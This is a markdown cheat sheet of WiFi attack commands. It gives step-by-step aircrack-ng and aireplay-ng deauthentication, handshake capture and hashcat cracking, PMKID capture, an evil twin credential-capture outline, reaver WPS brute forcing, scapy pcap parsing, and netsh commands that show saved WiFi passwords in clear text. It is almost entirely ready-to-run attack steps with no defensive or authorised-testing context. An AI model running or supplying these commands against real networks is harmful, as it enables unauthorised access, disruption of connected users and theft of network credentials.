# WiFi Attack Knowledge

## Tools
- **aircrack-ng**: WiFi cracking suite (Linux)
- **airodump-ng**: Capture packets, find networks
- **aireplay-ng**: Deauth attacks, packet injection
- **airmon-ng**: Enable monitor mode
- **hashcat**: GPU password cracking
- **wireshark/tshark**: Packet analysis
- **scapy**: Python packet manipulation

## Attack Flow

### 1. Enable Monitor Mode
```bash
airmon-ng start wlan0
```

### 2. Scan Networks
```bash
airodump-ng wlan0mon
```
Shows: BSSID, Channel, ESSID, Encryption, Clients

### 3. Target Specific Network
```bash
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

### 4. Deauth Attack (Force Handshake)
```bash
aireplay-ng -0 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```
- `-0 10`: Send 10 deauth packets
- `-a`: Target AP BSSID
- `-c`: Target client (optional)

### 5. Capture Handshake
Wait for "WPA handshake: <BSSID>" in airodump-ng

### 6. Crack Password
```bash
aircrack-ng -w wordlist.txt -b <BSSID> capture-01.cap
```

Or with hashcat (GPU):
```bash
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 22000 capture.hccapx wordlist.txt
```

## PMKID Attack (No Handshake Needed)
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.22000 pmkid.pcapng
hashcat -m 22000 hash.22000 wordlist.txt
```

## Evil Twin Attack
1. Create fake AP with same SSID
2. Deauth clients from real AP
3. Clients connect to fake AP
4. Capture credentials

## WPS Attacks
```bash
wash -i wlan0mon  # Find WPS enabled APs
reaver -i wlan0mon -b <BSSID> -vv
```

## Pcap Analysis (Python)
```python
from scapy.all import rdpcap, Dot11, EAPOL

packets = rdpcap("capture.pcap")

# Find handshakes
for pkt in packets:
    if pkt.haslayer(EAPOL):
        print(f"EAPOL frame from {pkt.addr2}")
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon
            print(f"AP: {pkt.info.decode()} BSSID: {pkt.addr2}")
```

## Windows Limitations
- No native monitor mode
- aircrack-ng suite limited
- Need: Kali VM, WSL2 with USB passthrough, or dedicated Linux box

## Windows Alternatives
- `netsh wlan show networks mode=bssid` - See nearby networks
- `netsh wlan show profiles` - Saved networks
- `netsh wlan show profile name="X" key=clear` - Get saved passwords
